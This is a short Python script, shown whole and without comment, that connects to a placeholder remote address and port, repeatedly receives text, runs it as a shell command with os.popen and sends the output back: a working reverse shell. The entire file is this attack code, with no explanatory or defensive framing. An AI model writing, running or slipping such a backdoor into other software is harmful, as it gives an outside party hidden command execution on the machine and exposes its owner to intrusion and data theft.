import socket
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<IP>",<PORT>))

while(True):
    data = s.recv(1024).decode()
    vars = os.popen(data).read()
    s.sendall(vars.encode())
